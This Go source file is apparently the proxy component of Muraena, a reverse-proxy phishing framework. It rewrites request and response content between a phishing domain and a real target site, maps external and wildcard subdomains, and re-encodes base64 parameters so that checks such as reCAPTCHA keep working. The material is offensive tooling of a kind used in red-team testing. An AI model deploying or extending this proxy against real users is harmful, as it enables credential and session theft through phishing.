package proxy

import (
	"fmt"
	"net/url"
	"regexp"
	"strings"

	"github.com/evilsocket/islazy/tui"

	"github.com/muraenateam/muraena/core"
	"github.com/muraenateam/muraena/log"
)

var (
	Wildcards = false
)

const (
	// Base64Padding is the padding to use within base64 operations
	Base64Padding = '='
)

// Base64 identifies if the transformation should consider base-64 data and the related padding rules
type Base64 struct {
	Enabled bool
	Padding []string
}

// Transform
// If used with forward=true, Transform uses Replacer to replace all occurrences of the phishing origin, the external domains defined,
// as well as the rest of the data to be replaced defined in MakeReplacements(), with the target real origin.
// If used with forward=false, Transform will replace data coming from the targeted origin
// with the real proxied origin (target).
// Forward:
// - true > change requests, i.e.  phishing > target origin
// - false > change response, i.e. target origin > phishing
// Base64:
// Since some request parameter values can be base64 encoded, we need to decode first,
// apply the transformation and re-encode (hello ReCaptcha)
func (r *Replacer) Transform(input string, forward bool, b64 Base64) (result string) {

	source := strings.TrimSpace(input)
	if source == "" {
		return source
	}

	var replacements []string
	var lastReplacements []string
	if forward { // used in Requests

		// if source contains ---XXwld, we need to patch the wildcard
		wildCardSeparator := r.getCustomWildCardSeparator()
		if strings.Contains(source, wildCardSeparator) {

			// Extract all urls from the source containing ---XXwld
			// and patch the wildcard
			regex := fmt.Sprintf("[a-zA-Z0-9.-]+%s\\d+.%s", wildCardSeparator, r.Phishing)
			re := regexp.MustCompile(regex)
			matchSubdomains := re.FindAllString(source, -1)
			matchSubdomains = ArmorDomain(matchSubdomains)
			if len(matchSubdomains) > 0 {
				log.Debug("Wildcard pattern: %v match %d!", re.String(), len(matchSubdomains))

				for _, element := range matchSubdomains {
					newDomain := r.PatchComposedWildcardURL(element)
					source = strings.ReplaceAll(source, element, newDomain)
				}

				log.Debug("Source after wildcard patching: %s", source)
			}

		}

		replacements = r.ForwardReplacements

		lastReplacements = r.LastForwardReplacements
	} else { // used in Responses
		replacements = r.BackwardReplacements
		lastReplacements = r.LastBackwardReplacements
	}

	// Handling of base64 encoded data which should be decoded before transformation
	source, base64Found, padding := transformBase64(source, b64, true, Base64Padding)

	// Replace transformation
	result = strings.NewReplacer(replacements...).Replace(source)
	// do last replacements
	result = strings.NewReplacer(lastReplacements...).Replace(result)

	// Re-encode if base64 encoded data was found
	if base64Found {
		result, _, _ = transformBase64(result, b64, false, padding)
	}

	// If the result is the same as the input, we don't need to do anything else
	if source != result {
		// Find wildcard matching
		if Wildcards {

			wldPrefix := fmt.Sprintf("%s%s", r.ExternalOriginPrefix, WildcardPrefix)
			if strings.Contains(result, "."+wldPrefix) {
				var rep []string

				// URL encoding handling
				urlEncoded := false
				decodedValue, err := url.QueryUnescape(result)
				if err == nil && result != decodedValue {
					urlEncoded = true
					result = decodedValue
				}

				domain := regexp.QuoteMeta(r.Phishing)
				re := regexp.MustCompile(fmt.Sprintf(`[a-zA-Z0-9.-]+%s\d+.%s`, WildcardPrefix, domain))
				matchSubdomains := re.FindAllString(result, -1)
				matchSubdomains = ArmorDomain(matchSubdomains)
				if len(matchSubdomains) > 0 {
					log.Debug("Wildcard pattern: %v match %d!", re.String(), len(matchSubdomains))
				}

				for _, element := range matchSubdomains {
					if core.StringContains(element, rep) {
						continue
					}

					if strings.HasPrefix(element, ".") {
						continue
					}

					if strings.HasPrefix(element, wldPrefix) {
						continue
					}

					// Patch the wildcard
					element = strings.ReplaceAll(element, "."+wldPrefix, "-"+wldPrefix)
					log.Info("[*] New wildcard %s (%s)", tui.Bold(tui.Red(element)), tui.Green(element))
					rep = append(rep, element)
				}

				if urlEncoded {
					encodedValue, err := url.QueryUnescape(result)
					if err != nil {
						log.Error(err.Error())
					} else {
						result = encodedValue
					}
				}

				if len(rep) > 0 {
					// Get the patched list of domains and update the replacer
					patched := r.patchWildcardList(rep)
					r.SetExternalOrigins(patched)
					if err := r.DomainMapping(); err != nil {
						log.Error(err.Error())
						return
					}

					if err = r.Save(); err != nil {
						log.Error("Error saving replacer: %s", err)
					}

					r.MakeReplacements()
					r.loopCount++
					log.Info("We need another (#%d) transformation loop, because of this new domains:%s",
						r.loopCount, tui.Green(fmt.Sprintf("%v", rep)))
					if r.loopCount > 30 {
						log.Error("Too many transformation loops, aborting.")
						return
					}

					return r.Transform(input, forward, b64)
				}
			}
		}
	}

	return
}

func (r *Replacer) PatchComposedWildcardURL(URL string) (result string) {
	result = URL

	wldPrefix := fmt.Sprintf("%s%s", r.ExternalOriginPrefix, WildcardPrefix)
	if strings.Contains(result, "---"+wldPrefix) {

		subdomain := strings.Split(result, "---")[0]
		wildcard := strings.Split(result, "---")[1]

		path := ""
		if strings.Contains(URL, r.Phishing+"/") {
			path = "/" + strings.Split(URL, r.Phishing+"/")[1]
		}
		wildcard = strings.Split(wildcard, "/")[0]

		wildcard = strings.TrimSuffix(wildcard, fmt.Sprintf(".%s", r.Phishing))

		domain := fmt.Sprintf("%s.%s", subdomain, r.patchWildcard(wildcard))
		log.Info("Wildcard to patch: %s (%s)", tui.Bold(tui.Red(result)), tui.Green(domain))

		// remove the protocol, anything befgore ://
		protocol := ""
		if strings.Contains(domain, "://") {
			protocol = strings.Split(domain, "://")[0] + "://"
			domain = strings.Split(domain, "://")[1]
		}
		r.SetExternalOrigins([]string{domain})

		result = fmt.Sprintf("%s%s%s", protocol, domain, path)
	}

	return
}

func transformBase64(input string, b64 Base64, decode bool, padding rune) (output string, base64Found bool, padding_out rune) {
	// Handling of base64 encoded data, that should be decoded/transformed/re-encoded
	base64Found = false
	if b64.Enabled { // decode
		if decode {
			var decoded string
			if len(b64.Padding) > 1 {
				for _, p := range b64.Padding {
					padding = getPadding(p)
					if decoded, base64Found = base64Decode(input, padding); base64Found {
						input = decoded
						base64Found = true
						break
					}
				}
			}
		} else {
			//encode
			return base64Encode(input, padding), base64Found, padding
		}
	}

	return input, base64Found, padding
}

func (r *Replacer) transformUrl(URL string, base64 Base64) (result string, err error) {

	if strings.Contains(URL, r.getCustomWildCardSeparator()) {
		URL = r.PatchComposedWildcardURL(URL)
	}

	result = r.Transform(URL, true, base64)

	// After initial transformation round.
	// If the input is a valid URL proceed by transforming also the query string
	hURL, err := url.Parse(result)
	if err != nil || hURL.Scheme == "" || hURL.Host == "" {
		// Not valid URL, but continue anyway it might be the case of different values.
		// Log the error and reset its value
		// log.Debug("Error while url.Parsing: %s\n%s", result, err)
		err = nil
		return
	}

	query, err := core.ParseQuery(hURL.RawQuery)
	if err != nil {
		return
	}

	for pKey := range query {
		for k, v := range query[pKey] {
			query[pKey][k] = r.Transform(v, true, base64)
		}
	}
	hURL.RawQuery = query.Encode()
	result = hURL.String()

	return
}

// PatchWildcardList patches the wildcard domains in the list
// and returns the patched list of domains to be used in the replacer
func (r *Replacer) patchWildcardList(rep []string) (prep []string) {
	rep = ArmorDomain(rep)
	for _, s := range rep {
		w := r.patchWildcard(s)
		if w != "" {
			prep = append(prep, w)
		}
	}

	return prep
}

func (r *Replacer) patchWildcard(rep string) (prep string) {
	found := false
	newDomain := strings.TrimSuffix(rep, fmt.Sprintf(".%s", r.Phishing))
	for w, d := range r.WildcardMapping {
		if strings.HasSuffix(newDomain, d) {
			newDomain = strings.TrimSuffix(newDomain, d)
			newDomain = strings.TrimSuffix(newDomain, "-")
			if newDomain != "" {
				newDomain = newDomain + "."
			}
			prep = newDomain + w
			found = true
		}
	}

	if !found {
		log.Error("Unknown wildcard domain: %s within %s", tui.Bold(tui.Red(rep)), rep)
	}

	return prep
}

// MakeReplacements prepares the forward and backward replacements to be used in the proxy
func (r *Replacer) MakeReplacements() {

	//
	// Requests
	//
	origins := r.GetOrigins()

	r.ForwardReplacements = []string{}
	r.ForwardReplacements = append(r.ForwardReplacements, []string{r.Phishing, r.Target}...)

	log.Debug("[Forward | Origins]: %d", len(origins))
	count := len(r.ForwardReplacements)
	for extOrigin, subMapping := range origins { // changes resource-1.phishing.

		if strings.HasPrefix(subMapping, WildcardPrefix) {
			// Ignoring wildcard at this stage
			log.Debug("[Wildcard] %s - %s", tui.Yellow(subMapping), tui.Green(extOrigin))
			continue
		}

		from := fmt.Sprintf("%s.%s", subMapping, r.Phishing)
		to := extOrigin
		rep := []string{from, to}
		r.ForwardReplacements = append(r.ForwardReplacements, rep...)

		count++
		log.Debug("[Forward | replacements #%d]: %s > %s", count, tui.Yellow(rep[0]), tui.Green(to))
	}

	// Append wildcards at the end
	for extOrigin, subMapping := range r.WildcardMapping {
		from := fmt.Sprintf("%s.%s", subMapping, r.Phishing)
		to := extOrigin
		rep := []string{from, to}
		r.ForwardReplacements = append(r.ForwardReplacements, rep...)

		count++
		log.Debug("[Wild Forward | replacements #%d]: %s > %s", count, tui.Yellow(rep[0]), tui.Green(to))
	}

	//
	// Responses
	//
	r.BackwardReplacements = []string{}
	r.BackwardReplacements = append(r.BackwardReplacements, []string{r.Target, r.Phishing}...)

	count = 0
	for include, subMapping := range origins {

		if strings.HasPrefix(subMapping, WildcardPrefix) {
			// Ignoring wildcard at this stage
			log.Debug("[Wildcard] %s - %s", tui.Yellow(subMapping), tui.Green(include))
			continue
		}

		from := include
		to := fmt.Sprintf("%s.%s", subMapping, r.Phishing)
		rep := []string{from, to}
		r.BackwardReplacements = append(r.BackwardReplacements, rep...)

		count++
		log.Debug("[Backward | replacements #%d]: %s < %s", count, tui.Green(rep[0]), tui.Yellow(to))
	}

	// Append wildcards at the end
	for include, subMapping := range r.WildcardMapping {
		from := include
		to := fmt.Sprintf("%s.%s", subMapping, r.Phishing)
		rep := []string{from, to}
		r.BackwardReplacements = append(r.BackwardReplacements, rep...)

		count++
		log.Debug("[Wild Backward | replacements #%d]: %s < %s", count, tui.Green(rep[0]), tui.Yellow(to))
	}

	//
	// These should be done as Final replacements
	r.LastBackwardReplacements = []string{}

	// Custom HTTP response replacements
	for _, tr := range r.CustomResponseTransformations {
		r.LastBackwardReplacements = append(r.LastBackwardReplacements, tr...)
		log.Debug("[Custom Replacements] %+v", tr)
	}

	r.BackwardReplacements = append(r.BackwardReplacements, r.LastBackwardReplacements...)

}

func (r *Replacer) DomainMapping() (err error) {
	baseDom := r.Target
	log.Debug("Proxy destination: %s", tui.Bold(tui.Green("*."+baseDom)))

	origins := make(map[string]string)
	r.WildcardMapping = make(map[string]string)

	count, wildcards := 0, 0
	for _, domain := range r.GetExternalOrigins() {
		if IsSubdomain(baseDom, domain) {
			trim := strings.TrimSuffix(domain, baseDom)

			// We don't map 1-level subdomains ..
			if strings.Count(trim, ".") < 2 {
				log.Warning("Ignore: %s [%s]", domain, trim)
				continue
			}
		}

		if isWildcard(domain) {
			// Wildcard domains
			wildcards++

			// Fix domain by removing the prefix *.
			domain = strings.TrimPrefix(domain, "*.")

			// Update the wildcard map
			prefix := fmt.Sprintf("%s%s", r.ExternalOriginPrefix, WildcardPrefix)
			o := fmt.Sprintf("%s%d", prefix, wildcards)
			r.WildcardDomain = o
			r.WildcardMapping[domain] = o
			//log.Info("Wild Including [%s]=%s", domain, o)
			log.Debug(fmt.Sprintf("Wild Including [%s]=%s", domain, o))

		} else {
			count++
			// Extra domains or nested subdomains
			o := fmt.Sprintf("%s%d", r.ExternalOriginPrefix, count)
			origins[domain] = o
			//log.Info("Including [%s]=%s", domain, o)
			log.Debug(fmt.Sprintf("Including [%s]=%s", domain, o))
		}

	}

	if wildcards > 0 {
		Wildcards = true
	}

	r.SetOrigins(origins)

	log.Debug("Processed %d domains to transform, %d are wildcards", count, wildcards)
	return
}
